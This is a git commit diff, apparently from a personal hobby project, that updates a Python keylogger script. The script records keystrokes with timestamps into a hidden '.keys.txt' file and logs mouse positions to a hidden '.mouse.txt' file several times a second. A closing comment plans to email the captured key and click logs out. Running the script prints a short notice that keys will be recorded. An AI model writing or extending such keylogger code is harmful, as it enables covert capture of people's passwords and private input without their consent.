865d202a95b847de42e0e60ebe582bd55cea7964
DhyeyLukhi <dhyeylukhi95@gmail.com>
2025-08-07 00:07:01 +0530

    Working very fine but need some upgrades

--- Key Logged/keylogged.py
+++ Key Logged/keylogged.py
@@ -1,41 +1,50 @@
 import keyboard
 import pyautogui
 import time
-import pynput
 import threading
+import datetime
 
 def recordKeys():
     while True:
         event = keyboard.record('enter')
-        with open('.keys.txt', 'w') as file:
+        with open('.keys.txt', 'a') as file:
             for e in event:
                 if e.event_type == 'down':
-                    file.write(f"'{e.name}'")
+                    clocktime = datetime.datetime.now().strftime("%r")
+                    file.write(f"'{e.name}'  At {clocktime}\n'")
+            
 
 
 def mouseMonitor():
+    size = pyautogui.size()
+    with open('.mouse.txt', 'w') as file:
+        file.write(f"Size: {size.width}x{size.height} \n")
+    
     while True:
         position = pyautogui.position()
-        size = pyautogui.size()
-        print(f"Click on X:{position.x}   Y:{position.y}    Size: Width:{size.width}  Height{size.height}")
-        time.sleep(1)
-
+        with open('.mouse.txt', 'a') as file:
+            clocktime = datetime.datetime.now().strftime("%r")
+            file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
+            time.sleep(0.2)
 
 
 if __name__ == "__main__":
     print("Hello user...")
     print("I want to record some keys from your keyboard")
+    # time.sleep(3)
     keyboardThread = threading.Thread(target=recordKeys)
     mouseThread = threading.Thread(target=mouseMonitor)
 
     keyboardThread.start()
     mouseThread.start()
     keyboardThread.join()
-    mouseThread.join()    
-
+    mouseThread.join()
 
 
 
 
 
 # if i have to write soemthing on the user console then use the pyautogui.write function instead of keyboard.write (use keyboard.wrte to get a feel like chatgpt is writing in the console)
+
+
+# Implementation: Add the mouse monitoring so whenever user clicks, the mouse position got noted, also add this for scrolling, and sending the key logs and click logs via mail
